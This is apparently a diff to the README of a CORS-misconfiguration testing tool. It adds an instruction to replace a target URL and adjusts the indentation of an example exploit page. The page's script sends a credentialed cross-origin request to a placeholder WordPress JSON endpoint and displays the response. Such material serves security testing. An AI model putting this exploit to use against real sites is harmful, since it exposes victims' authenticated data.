@@ -38,6 +38,8 @@ Note: In this tool i used sample domain file but you have to choose your own url
 
 Here is the Example code for exploiting the CORS misconfiguration:
 
+Goto this line and replace the URL xhr.open("GET", "https://www.vulnerable.com/blog/wp-json/", true);
+
 ```
 <!DOCTYPE html>
 <html>
@@ -74,7 +76,7 @@ Here is the Example code for exploiting the CORS misconfiguration:
                  document.getElementById("demo").innerHTML = alert(this.responseText);
                  }
              };
-              xhr.open("GET", "https://www.vulnerable.com/blog/wp-json/", true);
+             xhr.open("GET", "https://www.vulnerable.com/blog/wp-json/", true);
              xhr.withCredentials = true;
              xhr.send();
              }
